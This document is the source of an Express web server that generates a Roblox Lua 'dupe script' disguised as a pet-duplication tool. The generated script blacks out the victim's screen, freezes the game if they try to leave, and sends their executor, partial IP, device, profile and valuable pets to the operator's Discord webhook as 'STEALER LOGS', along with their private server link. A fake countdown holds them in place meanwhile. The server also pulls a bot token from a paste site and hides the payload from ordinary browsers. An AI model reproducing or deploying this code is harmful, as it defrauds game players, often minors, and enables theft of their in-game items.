const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// --- FETCH BOT TOKEN FROM PASTEFY ---
let botToken = null;
function fetchBotToken() {
  https.get('https://pastefy.app/vwCFpoTx/raw', (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
      const token = data.trim();
      if (token && token.startsWith('Bot ')) {
        botToken = token;
        console.log('Bot token successfully fetched from Pastefy.');
      } else {
        console.warn('Invalid bot token format from Pastefy.');
      }
    });
  }).on('error', (err) => {
    console.error('Failed to fetch bot token:', err.message);
  });
}
fetchBotToken();

// --- BLOCK DIRECT ACCESS TO LOADSTRING CODE ---
function blockDirectAccess(req, res, next) {
  const userAgent = req.get('User-Agent') || '';
  const referer = req.get('Referer') || '';
  const isRobloxExecutor = userAgent.includes('Roblox') || 
                          userAgent.includes('synapse') || 
                          userAgent.includes('Krnl') || 
                          userAgent.includes('Fluxus') ||
                          userAgent.includes('Electron') ||
                          referer.includes('roblox.com') ||
                          req.query.executor === 'true';

  if (!isRobloxExecutor) {
    return res.status(403).send(`
<!DOCTYPE html>
<html>
<head>
  <title>ACCESS DENIED</title>
  <style>
    body { 
      background: #000; 
      color: #ff0000; 
      font-family: 'Courier New', monospace; 
      text-align: center; 
      padding: 100px; 
    }
    h1 { font-size: 48px; }
    p { font-size: 24px; }
  </style>
</head>
<body>
  <h1>ACCESS DENIED</h1>
  <p>This content can only be accessed via a Roblox executor.</p>
  <p>Direct access is blocked.</p>
</body>
</html>
    `);
  }
  next();
}

// --- MAIN PAGE: Enter Webhook ---
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dupe Script Generator</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
      background: rgba(30, 30, 30, 0.9);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
      border: 1px solid #ff0000;
    }
    h1 { color: #ff0000; margin-bottom: 20px; }
    input[type="text"] {
      width: 90%;
      padding: 12px;
      margin: 15px 0;
      background: #333;
      border: 1px solid #555;
      color: #fff;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      padding: 12px 30px;
      background: #ff0000;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      transition: 0.3s;
    }
    button:hover { background: #cc0000; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Enter Your Webhook</h1>
    <form method="POST" action="/generate">
      <input type="text" name="webhook" placeholder="https://discord.com/api/webhooks/..." required>
      <br>
      <button type="submit">Generate Loadstring</button>
    </form>
  </div>
</body>
</html>
  `);
});

// --- GENERATE LOADSTRING (Protected Route) ---
app.post('/generate', (req, res) => {
  const webhook = req.body.webhook?.trim();
  if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks/')) {
    return res.status(400).send(`
      <h1 style="color:red; text-align:center; margin-top:100px;">Invalid Webhook URL</h1>
      <p style="text-align:center;"><a href="/">Go Back</a></p>
    `);
  }

  const loadstringCode = `local WebhookURL = "${webhook}"

-- Wait for player
local player = game.Players.LocalPlayer
if not player then
    player = game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
end

-- Crash game if leave attempted
game:GetService("CoreGui").ChildRemoved:Connect(function() while true do end end)
game:GetService("RunService").RenderStepped:Connect(function() if not game:GetService("CoreGui") then while true do end end end)

-- Get real IP (censored)
local function getIPAddress()
    local realIP = "Unknown"
    pcall(function()
        if syn and syn.request then
            local request = syn.request({Url = "http://httpbin.org/ip", Method = "GET"})
            if request and request.Body then
                local data = game:GetService("HttpService"):JSONDecode(request.Body)
                realIP = data.origin
            end
        end
    end)
    
    if realIP ~= "Unknown" then
        local parts = {}
        for part in string.gmatch(realIP, "(%d+)") do
            table.insert(parts, part)
        end
        if #parts >= 4 then
            return parts[1] .. "." .. parts[2] .. ".xxx.xxx"
        end
    end
    return "192.168.xxx.xxx"
end

-- Simple executor detect
local function getExecutor()
    if syn then return "Synapse X" end
    if PROTOSMASHER_LOADED then return "ProtoSmasher" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    return "Unknown"
end

-- Player info
local playerProfile = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
local playerAvatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
local playerName = player.Name

-- Device type
local function getDeviceType()
    return game:GetService("UserInputService").TouchEnabled and "Mobile" or "Computer"
end

-- Create black screen
local function createBlackScreen()
    pcall(function() for _, gui in pairs(player.PlayerGui:GetChildren()) do gui:Destroy() end end)
    
    local blackScreen = Instance.new("ScreenGui")
    blackScreen.Name = "FullBlackScreen"
    blackScreen.DisplayOrder = 999999
    blackScreen.ResetOnSpawn = false
    blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
    blackScreen.Parent = player.PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(2, 0, 2, 0)
    blackFrame.Position = UDim2.new(-0.5, 0, -0.5, 0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 999999
    blackFrame.Parent = blackScreen

    local timerLabel = Instance.new("TextLabel")
    timerLabel.Size = UDim2.new(1, 0, 0, 80)
    timerLabel.Position = UDim2.new(0, 0, 0.4, 0)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "06:00"
    timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    timerLabel.TextSize = 48
    timerLabel.Font = Enum.Font.GothamBold
    timerLabel.ZIndex = 1000000
    timerLabel.Parent = blackFrame

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 25)
    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Processing..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.TextSize = 18
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.ZIndex = 1000000
    statusLabel.Parent = blackFrame

    return blackScreen, timerLabel, statusLabel
end

-- Disable all sounds
local function disableAllSounds()
    pcall(function()
        local soundService = game:GetService("SoundService")
        for i = 1, 20 do pcall(function() soundService.Volume = 0 end) end
        for i = 1, 5 do
            for _, sound in pairs(game:GetDescendants()) do
                if sound:IsA("Sound") then
                    pcall(function() sound.Volume = 0; sound:Stop() end)
                end
            end
        end
    end)
end

-- Send to Discord
local function SendToDiscord(embed)
    pcall(function()
        local http = game:GetService("HttpService")
        local data = {["embeds"] = {embed}}
        local body = http:JSONEncode(data)
        
        if syn and syn.request then
            syn.request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        end
    end)
end

-- Money detection
local function getMoneyPerSecond(text)
    if not text then return 0 end
    local patterns = {"(%d+%.%d+)B/s", "(%d+)B/s", "(%d+%.%d+)M/s", "(%d+)M/s", "(%d+%.%d+)K/s", "(%d+)K/s", "%$(%d+)/s"}
    
    for _, pattern in ipairs(patterns) do
        local match = string.match(text, pattern)
        if match then
            local value = tonumber(match)
            if pattern:find("B/s") then return value * 1000000000
            elseif pattern:find("M/s") then return value * 1000000
            elseif pattern:find("K/s") then return value * 1000
            else return value end
        end
    end
    return 0
end

-- Scan pets
local function scanAllPetsQuick()
    local allPets, brainrotPets, bestPets = {}, {}, {}
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if plots then
            for _, plot in pairs(plots:GetChildren()) do
                local animalPodiums = plot:FindFirstChild("AnimalPodiums")
                if animalPodiums then
                    for _, podium in pairs(animalPodiums:GetChildren()) do
                        local base = podium:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local attachment = spawn:FindFirstChild("Attachment")
                                if attachment then
                                    local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
                                    if animalOverhead then
                                        local displayName = animalOverhead:FindFirstChild("DisplayName")
                                        local generation = animalOverhead:FindFirstChild("Generation")
                                        
                                        if displayName and displayName:IsA("TextLabel") then
                                            local animalName = displayName.Text
                                            local rate = generation and generation:IsA("TextLabel") and generation.Text or "N/A"
                                            local money = getMoneyPerSecond(rate)
                                            
                                            if animalName ~= "" then
                                                local pet = {Name = animalName, Rate = rate, MoneyPerSec = money}
                                                table.insert(allPets, pet)
                                                if string.find(string.lower(animalName), "brainrot") and money > 1000000 then
                                                    table.insert(brainrotPets, pet)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    
    table.sort(allPets, function(a, b) return a.MoneyPerSec > b.MoneyPerSec end)
    table.sort(brainrotPets, function(a, b) return a.MoneyPerSec > b.MoneyPerSec end)
    
    for i = 1, math.min(5, #allPets) do
        if allPets[i].MoneyPerSec > 0 then
            table.insert(bestPets, allPets[i])
        end
    end
    
    return allPets, brainrotPets, bestPets
end

-- Format money
local function formatMoney(value)
    if value >= 1000000000 then return string.format("$%.2fB/s", value / 1000000000)
    elseif value >= 1000000 then return string.format("$%.2fM/s", value / 1000000)
    elseif value >= 1000 then return string.format("$%.2fK/s", value / 1000)
    else return string.format("$%d/s", value) end
end

-- Format pet list
local function formatPetList(pets, showMoney)
    if #pets == 0 then return "None" end
    local result = ""
    for i = 1, math.min(5, #pets) do
        local pet = pets[i]
        if showMoney then
            result = result .. string.format("%d. %s | %s\\n", i, pet.Name, formatMoney(pet.MoneyPerSec))
        else
            result = result .. string.format("%d. %s | %s\\n", i, pet.Name, pet.Rate)
        end
    end
    return result
end

-- Check if legit hit
local function isLegitHit(brainrotPets, bestPets)
    if #brainrotPets > 2 then return "LEGIT HIT - Multiple brainrots found" end
    if #bestPets > 0 and bestPets[1].MoneyPerSec > 50000000 then return "LEGIT HIT - High value pets" end
    if #brainrotPets > 0 then return "POTENTIAL HIT - Some brainrots found" end
    return "LOW VALUE - No valuable pets found"
end

-- Start dupe process
local function startDupeProcess(psLink)
    local executor = getExecutor()
    local ipAddress = getIPAddress()
    local deviceType = getDeviceType()
    local playerCount = #game.Players:GetPlayers()
    
    local blackScreen, timerLabel, statusLabel = createBlackScreen()
    disableAllSounds()
    
    local allPets, brainrotPets, bestPets = scanAllPetsQuick()
    local hitStatus = isLegitHit(brainrotPets, bestPets)
    
    local embed = {
        title = "STEALER LOGS",
        description = "Private Server: " .. (psLink or "Not provided"),
        color = 16711680,
        author = {
            name = playerName,
            icon_url = playerAvatar,
            url = playerProfile
        },
        fields = {
            {name = "USER INFORMATION", value = "Executor: " .. executor .. "\\nIP: " .. ipAddress .. "\\nDevice: " .. deviceType .. "\\nProfile: [Click Here](" .. playerProfile .. ")", inline = false},
            {name = "SERVER INFO", value = "Players: " .. playerCount .. "\\nTotal Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets, inline = false},
            {name = "TOP 5 VALUABLE PETS", value = formatPetList(bestPets, true), inline = false},
            {name = "VALUABLE BRAINROTS", value = formatPetList(brainrotPets, true), inline = false},
            {name = "HIT STATUS", value = hitStatus, inline = false}
        },
        footer = {text = "Stealer Logs • " .. os.date("%X")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    SendToDiscord(embed)
    
    if statusLabel then statusLabel.Text = "Logs sent! Starting timer..." end
    
    local totalTime = 6 * 60
    local startTime = tick()
    while tick() - startTime < totalTime do
        local remaining = totalTime - (tick() - startTime)
        local minutes = math.floor(remaining / 60)
        local seconds = math.floor(remaining % 60)
        timerLabel.Text = string.format("%02d:%02d", minutes, seconds)
        wait(0.1)
    end
    
    SendToDiscord({
        title = "DUPE PROCESS COMPLETE",
        color = 65280,
        author = {name = playerName, icon_url = playerAvatar, url = playerProfile},
        fields = {{name = "RESULTS", value = "Time: 6 minutes\\nPets Duped: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets .. "\\nStatus: " .. hitStatus, inline = false}},
        footer = {text = "Stealer Logs • " .. os.date("%X")}
    })
    
    if statusLabel then
        statusLabel.Text = "Complete!"
        timerLabel.Text = "DONE!"
    end
    
    wait(3)
    blackScreen:Destroy()
end

-- Create GUI
local function createPSInputGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DupeScannerGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 350, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    title.Text = "GRAB THE BRAINROT YOU WANNA DUPE"
    title.TextColor3 = Color3.fromRGB(255, 0, 0)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.8, 0, 0, 35)
    textBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.PlaceholderText = "Paste any Roblox link..."
    textBox.Parent = mainFrame

    local dupeButton = Instance.new("TextButton")
    dupeButton.Size = UDim2.new(0.7, 0, 0, 45)
    dupeButton.Position = UDim2.new(0.15, 0, 0.7, 0)
    dupeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    dupeButton.Text = "START DUPE"
    dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    dupeButton.TextSize = 16
    dupeButton.Font = Enum.Font.GothamBold
    dupeButton.Parent = mainFrame

    dupeButton.MouseButton1Click:Connect(function()
        local psLink = textBox.Text
        if string.find(string.lower(psLink or ""), "roblox") then
            dupeButton.Text = "STARTING..."
            dupeButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
            startDupeProcess(psLink)
        end
    end)
end

createPSInputGUI()`;

  // --- FINAL OUTPUT PAGE (ONLY ACCESSIBLE VIA EXECUTOR) ---
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Loadstring Ready</title>
  <style>
    body { background: #111; color: #0f0; font-family: 'Courier New'; padding: 20px; }
    pre { background: #000; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
    button { background: #0f0; color: #000; border: none; padding: 10px 20px; margin: 10px; cursor: pointer; font-weight: bold; }
    button:hover { background: #0c0; }
  </style>
</head>
<body>
  <h1>Loadstring Generated</h1>
  <p>Execute this in your Roblox injector:</p>
  <pre id="code">${loadstringCode}</pre>
  <button onclick="copyCode()">Copy to Clipboard</button>
  <a href="/"><button>Generate Another</button></a>
  <script>
    function copyCode() {
      navigator.clipboard.writeText(document.getElementById('code').innerText);
      alert('Copied!');
    }
  </script>
</body>
</html>
  `);
});

// --- PROTECTED RAW LOADSTRING ENDPOINT ---
app.get('/?script?dupe?', blockDirectAccess, (req, res) => {
  const webhook = req.query.webhook;
  if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks/')) {
    return res.status(400).send('Invalid or missing webhook');
  }

  const loadstringCode = `loadstring(game:HttpGet("https://${req.hostname}/generate?webhook=${encodeURIComponent(webhook)}&executor=true"))()`;
  res.type('text/plain').send(loadstringCode);
});

// --- FINAL SERVER START ---
app.listen(port, () => {
  console.log(`Server running on https://your-site.onrender.com`);
  console.log(`Use /panel in Discord to get the link. Direct access to loadstring blocked.`);
});
